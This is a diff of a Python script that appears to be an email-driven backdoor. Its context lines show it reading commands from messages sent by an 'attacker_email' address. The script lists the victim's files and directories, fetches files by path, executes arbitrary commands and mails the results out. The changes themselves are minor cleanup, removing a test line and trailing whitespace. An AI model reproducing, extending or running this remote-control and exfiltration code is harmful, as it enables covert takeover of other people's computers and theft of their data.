@@ -49,7 +49,6 @@ def showFiles(com):
         files_string += file + "\n"
     payload = "Files:\n" + files_string + "\nDirectories:\n" + directories_string
     print(payload)
-    payload = "TEST Test ttes test"
     sendEmail(payload)
 
 #EMAIL SUBJECT = fetch [file name]
@@ -81,19 +80,19 @@ def readEmail():
     mail.login(emailAdr, password)
     mail.select('inbox')
 
-    typ, data = mail.search(None, 'ALL')  
+    typ, data = mail.search(None, 'ALL')
     for i in data[0].split():
         typ, data = mail.fetch(i, '(RFC822)' )
         msg = email.message_from_bytes(data[0][1])
         subject = msg['Subject']
         sender = msg['From']
         if(sender == attacker_email):
-            commands.append(subject)    
+            commands.append(subject)
             print ('From : ' + sender + '\n')
             print ('Subject : ' + subject + '\n')
-    
+
     if commands:
-       commandParser(commands) 
+       commandParser(commands)
 
     mail.expunge()
 
@@ -120,4 +119,4 @@ showFiles("show C:/")
 #Directories - show [Directory name]
 #Files - fetch [Absolute file path]
 #Commands - execute [commands]
-#Download - 
+#Download -
